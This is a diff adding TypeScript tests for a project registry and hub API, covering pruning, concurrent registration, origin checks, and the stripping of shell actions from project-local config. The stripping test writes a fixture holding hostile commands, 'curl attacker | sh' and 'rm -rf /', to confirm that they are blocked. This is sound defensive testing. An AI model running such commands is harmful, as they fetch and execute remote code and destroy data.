@@ -105,6 +105,86 @@ describe("project registry", () => {
     registry.dismiss(entry.info.id);
     registry.stop();
   });
+
+  test("prune demotes crash-orphaned actives, then drops them after the linger window", async () => {
+    const registry = makeRegistry();
+    const entry = await registry.register({ cwd: repoDir });
+    const HOUR = 60 * 60 * 1000;
+
+    registry.prune(Date.now() + 25 * HOUR);
+    expect(registry.get(entry.info.id)!.info.status).toBe("inactive");
+
+    // Linger window is anchored at demotion time, not lastSeenAt
+    registry.prune(Date.now() + 26 * HOUR);
+    expect(registry.get(entry.info.id)).toBeDefined();
+
+    registry.prune(Date.now() + 51 * HOUR);
+    expect(registry.get(entry.info.id)).toBeUndefined();
+    registry.stop();
+  });
+
+  test("concurrent register calls for the same cwd create one entry and one watcher", async () => {
+    let watchersCreated = 0;
+    const countingFactory: WatcherFactory = () => {
+      watchersCreated++;
+      return { close: () => {} };
+    };
+    const registry = createProjectRegistry({
+      runner: defaultCommandRunner,
+      watcherFactory: countingFactory,
+      persistPath,
+    });
+    const [a, b] = await Promise.all([
+      registry.register({ cwd: repoDir }),
+      registry.register({ cwd: repoDir }),
+    ]);
+    expect(a.info.id).toBe(b.info.id);
+    expect(watchersCreated).toBe(1);
+    registry.dismiss(a.info.id);
+    registry.stop();
+  });
+
+  test("shell actions from project-local config are stripped unless opted in", async () => {
+    const actionsDir = join(repoDir, ".cmux-hub");
+    execSync(`mkdir -p ${actionsDir}`);
+    writeFileSync(
+      join(actionsDir, "actions.json"),
+      JSON.stringify([
+        { label: "Evil", type: "shell", command: "curl attacker | sh" },
+        { label: "Fine", type: "paste-and-enter", command: "review this" },
+        {
+          label: "More",
+          submenu: [
+            { label: "Nested evil", type: "shell", command: "rm -rf /" },
+            { label: "Nested fine", type: "paste", command: "hello" },
+          ],
+        },
+      ]),
+    );
+    try {
+      const registry = makeRegistry();
+      const entry = await registry.register({ cwd: repoDir });
+      const labels = entry.actions.flatMap((a) =>
+        "submenu" in a ? a.submenu.map((s) => s.label) : [a.label],
+      );
+      expect(labels).toEqual(["Fine", "Nested fine"]);
+      registry.dismiss(entry.info.id);
+      registry.stop();
+
+      const permissive = createProjectRegistry({
+        runner: defaultCommandRunner,
+        watcherFactory: noopWatcherFactory,
+        persistPath,
+        allowProjectShellActions: true,
+      });
+      const entry2 = await permissive.register({ cwd: repoDir });
+      expect(entry2.actions).toHaveLength(3);
+      permissive.dismiss(entry2.info.id);
+      permissive.stop();
+    } finally {
+      rmSync(actionsDir, { recursive: true, force: true });
+    }
+  });
 });
 
 describe("hub API", () => {
@@ -201,6 +281,46 @@ describe("hub API", () => {
     expect(json.text).toBe("a.ts:1-2 check this");
 
     registry.dismiss(id);
+    registry.stop();
+    app.stop();
+  });
+
+  test("registration endpoints reject browser-originated requests", async () => {
+    const registry = makeRegistry();
+    const app = makeApp(registry);
+    const route = app.apiRoutes["/api/projects/register"] as {
+      POST: (req: Request) => Promise<Response>;
+    };
+    // Same-origin browser request (carries Origin) must be rejected —
+    // registration is hook/curl-only
+    const res = await route.POST(
+      new Request(`http://127.0.0.1:${PORT}/api/projects/register`, {
+        method: "POST",
+        headers: { ...validHeaders(), origin: `http://127.0.0.1:${PORT}` },
+        body: JSON.stringify({ cwd: repoDir }),
+      }),
+    );
+    expect(res.status).toBe(403);
+    registry.stop();
+    app.stop();
+  });
+
+  test("hub mode rejects cross-port localhost origins (strict origin)", async () => {
+    const registry = makeRegistry();
+    const app = makeApp(registry);
+    const route = app.apiRoutes["/api/projects"] as { GET: (req: Request) => Promise<Response> };
+    const crossPort = await route.GET(
+      new Request(`http://127.0.0.1:${PORT}/api/projects`, {
+        headers: { ...validHeaders(), origin: "http://localhost:9999" },
+      }),
+    );
+    expect(crossPort.status).toBe(403);
+    const sameOrigin = await route.GET(
+      new Request(`http://127.0.0.1:${PORT}/api/projects`, {
+        headers: { ...validHeaders(), origin: `http://127.0.0.1:${PORT}` },
+      }),
+    );
+    expect(sameOrigin.status).toBe(200);
     registry.stop();
     app.stop();
   });
